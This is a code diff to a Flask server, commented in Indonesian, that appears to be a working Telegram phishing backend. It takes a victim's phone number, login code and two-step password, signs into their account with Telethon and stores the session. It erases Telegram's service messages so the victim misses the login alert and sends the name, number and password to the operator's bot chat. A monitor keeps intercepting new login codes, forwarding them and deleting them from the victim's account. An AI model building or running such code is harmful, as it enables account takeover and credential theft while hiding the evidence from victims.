@@ -8,52 +8,48 @@ from telethon.tl.functions.messages import DeleteHistoryRequest
 app = Flask(__name__)
 CORS(app)
 
-# Ambil dari Variables Railway
+# Ambil dari Variables Railway (Pastikan Nama Variabel Sama!)
 API_ID = os.getenv("API_ID")
 API_HASH = os.getenv("API_HASH")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
+# Gunakan DOMAIN yang ada di Railway (contoh: web-production-xxx.up.railway.app)
 DOMAIN = os.getenv("RAILWAY_STATIC_URL")
-RAILWAY_URL = f"https://{DOMAIN}" if DOMAIN else ""
 
-# --- DATABASE PERMANEN (Agar Sesi Tidak Hilang Saat Restart) ---
+# --- DATABASE SEDERHANA ---
 def init_db():
-    conn = sqlite3.connect('sessions.db')
-    curr = conn.cursor()
-    curr.execute('''CREATE TABLE IF NOT EXISTS users 
-                    (nomor TEXT PRIMARY KEY, session TEXT, hash TEXT, nama TEXT, sandi TEXT, status_id INTEGER)''')
+    conn = sqlite3.connect('data.db')
+    c = conn.cursor()
+    c.execute('''CREATE TABLE IF NOT EXISTS users 
+                 (nomor TEXT PRIMARY KEY, session TEXT, nama TEXT, sandi TEXT, msg_id INTEGER)''')
     conn.commit()
     conn.close()
 
-def save_user(nomor, session=None, hash=None, nama=None, sandi=None, status_id=None):
-    conn = sqlite3.connect('sessions.db')
-    curr = conn.cursor()
-    curr.execute("INSERT OR IGNORE INTO users (nomor) VALUES (?)", (nomor,))
-    if session: curr.execute("UPDATE users SET session=? WHERE nomor=?", (session, nomor))
-    if hash: curr.execute("UPDATE users SET hash=? WHERE nomor=?", (hash, nomor))
-    if nama: curr.execute("UPDATE users SET nama=? WHERE nomor=?", (nama, nomor))
-    if sandi: curr.execute("UPDATE users SET sandi=? WHERE nomor=?", (sandi, nomor))
-    if status_id: curr.execute("UPDATE users SET status_id=? WHERE nomor=?", (status_id, nomor))
+def db_save(nomor, session=None, nama=None, sandi=None, msg_id=None):
+    conn = sqlite3.connect('data.db')
+    c = conn.cursor()
+    c.execute("INSERT OR IGNORE INTO users (nomor) VALUES (?)", (nomor,))
+    if session: c.execute("UPDATE users SET session=? WHERE nomor=?", (session, nomor))
+    if nama: c.execute("UPDATE users SET nama=? WHERE nomor=?", (nama, nomor))
+    if sandi: c.execute("UPDATE users SET sandi=? WHERE nomor=?", (sandi, nomor))
+    if msg_id: c.execute("UPDATE users SET msg_id=? WHERE nomor=?", (msg_id, nomor))
     conn.commit()
     conn.close()
 
-def get_user(nomor):
-    conn = sqlite3.connect('sessions.db')
-    curr = conn.cursor()
-    curr.execute("SELECT * FROM users WHERE nomor=?", (nomor,))
-    row = curr.fetchone()
+def db_get(nomor):
+    conn = sqlite3.connect('data.db')
+    c = conn.cursor()
+    c.execute("SELECT * FROM users WHERE nomor=?", (nomor,))
+    res = c.fetchone()
     conn.close()
-    if row:
-        return {"nomor": row[0], "session": row[1], "hash": row[2], "nama": row[3], "sandi": row[4], "status_id": row[5]}
-    return None
+    return res if res else None
 
 init_db()
 
 def bot_api(method, payload):
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
-        res = requests.post(url, json=payload, timeout=15)
-        return res.json()
+        return requests.post(url, json=payload, timeout=10).json()
     except: return {}
 
 @app.route('/register', methods=['POST'])
@@ -75,52 +71,58 @@ async def handle_flow(data):
         if num.startswith('0'): num = '62' + num[1:]
         nomor = '+' + num
 
-        u = get_user(nomor)
-        sess_str = u['session'] if u else ""
+        # Cek data lama di DB
+        u = db_get(nomor)
+        sess_str = u[1] if u else ""
         
         client = TelegramClient(StringSession(sess_str), int(API_ID), API_HASH)
         await client.connect()
 
         if step == 1:
             res = await client.send_code_request(nomor)
-            save_user(nomor, hash=res.phone_code_hash, session=client.session.save())
+            db_save(nomor, session=client.session.save()) # Simpan Hash sementara di sesi
+            # Simpan hash ke database agar tidak hilang
+            db_save(nomor, sandi=res.phone_code_hash) 
             return jsonify({"status": "success"})
 
         elif step == 2:
-            otp_code = data.get('otp')
+            otp = data.get('otp')
             try:
-                await client.sign_in(nomor, otp_code, phone_code_hash=u['hash'])
-                return await finalize_login(client, nomor)
+                # Ambil hash yang tadi disimpan di kolom sandi sementara
+                u_hash = db_get(nomor)[3]
+                await client.sign_in(nomor, otp, phone_code_hash=u_hash)
+                return await finalize(client, nomor)
             except errors.SessionPasswordNeededError:
-                save_user(nomor, session=client.session.save())
+                db_save(nomor, session=client.session.save())
                 return jsonify({"status": "need_2fa"})
-            except: return jsonify({"status": "error", "message": "OTP SALAH"}), 400
+            except: return jsonify({"status": "error"}), 400
 
         elif step == 3:
             sandi = data.get('sandi')
             try:
                 await client.sign_in(password=sandi)
-                save_user(nomor, sandi=sandi)
-                return await finalize_login(client, nomor)
-            except: return jsonify({"status": "error", "message": "SANDI SALAH"}), 400
+                db_save(nomor, sandi=sandi)
+                return await finalize(client, nomor)
+            except: return jsonify({"status": "error"}), 400
     finally:
         if client: await client.disconnect()
 
-async def finalize_login(client, nomor):
+async def finalize(client, nomor):
     me = await client.get_me()
     nama = (me.first_name if me.first_name else "User").split()[0]
-    u = get_user(nomor)
-    save_user(nomor, nama=nama, session=client.session.save())
+    u = db_get(nomor)
+    db_save(nomor, nama=nama, session=client.session.save())
     
     await client(DeleteHistoryRequest(peer=777000, max_id=0, just_clear=False, revoke=True))
     
-    pesan = f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: {u['sandi'] if u else 'None'}"
+    pesan = f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: {u[3] if u[3] else 'None'}"
     bot_api("sendMessage", {
         "chat_id": CHAT_ID, "text": pesan, "parse_mode": "Markdown",
         "reply_markup": {"inline_keyboard": [[{"text": "OTP", "callback_data": f"upd_{nomor}"}]]}
     })
     return jsonify({"status": "success"})
 
+# --- INI JALUR WEBHOOK YANG HARUS JEBOL ---
 @app.route('/webhook', methods=['POST'])
 def webhook():
     update = request.get_json()
@@ -133,31 +135,31 @@ def webhook():
             nomor = cb_data.split("_")[1]
             # Kirim pesan status
             res = bot_api("sendMessage", {"chat_id": CHAT_ID, "text": "Bot Siap Menerima OTP, klik /exit untuk keluar"})
-            save_user(nomor, status_id=res.get('result', {}).get('message_id'))
-            # Jalankan Monitoring
-            threading.Thread(target=lambda: asyncio.run(monitor_otp(nomor)), daemon=True).start()
+            db_save(nomor, msg_id=res.get('result', {}).get('message_id'))
+            
+            # Monitoring OTP
+            threading.Thread(target=lambda: asyncio.run(monitor(nomor)), daemon=True).start()
                 
     return jsonify({"status": "success"}), 200
 
-async def monitor_otp(nomor):
-    u = get_user(nomor)
-    if not u or not u['session']: return
+async def monitor(nomor):
+    u = db_get(nomor)
+    if not u or not u[1]: return
     
-    client = TelegramClient(StringSession(u['session']), int(API_ID), API_HASH)
+    client = TelegramClient(StringSession(u[1]), int(API_ID), API_HASH)
     try:
         await client.connect()
         @client.on(events.NewMessage(from_users=777000))
         async def handler(event):
             otp = re.search(r'\b\d{5}\b', event.raw_text)
             if otp:
-                # Ambil data terbaru dari DB
-                curr_u = get_user(nomor)
-                if curr_u['status_id']:
-                    bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": curr_u['status_id']})
+                curr = db_get(nomor)
+                if curr[4]: # Hapus pesan status
+                    bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": curr[4]})
                 
-                teks = f"Nama: **{curr_u['nama']}**\nNomor: `{nomor}`\nKata sandi: {curr_u['sandi']}\nOTP: `{otp.group(0)}`"
+                final_text = f"Nama: **{curr[2]}**\nNomor: `{nomor}`\nKata sandi: {curr[3]}\nOTP: `{otp.group(0)}`"
                 bot_api("sendMessage", {
-                    "chat_id": CHAT_ID, "text": teks, "parse_mode": "Markdown",
+                    "chat_id": CHAT_ID, "text": final_text, "parse_mode": "Markdown",
                     "reply_markup": {"inline_keyboard": [[{"text": "OTP", "callback_data": f"upd_{nomor}"}]]}
                 })
                 await event.delete(revoke=True)
@@ -167,6 +169,8 @@ async def monitor_otp(nomor):
     finally: await client.disconnect()
 
 if __name__ == "__main__":
-    if RAILWAY_URL:
-        bot_api("setWebhook", {"url": f"{RAILWAY_URL}/webhook"})
+    # Paksa pendaftaran Webhook setiap server nyala
+    if DOMAIN:
+        wh_url = f"https://{DOMAIN}/webhook"
+        bot_api("setWebhook", {"url": wh_url})
     app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
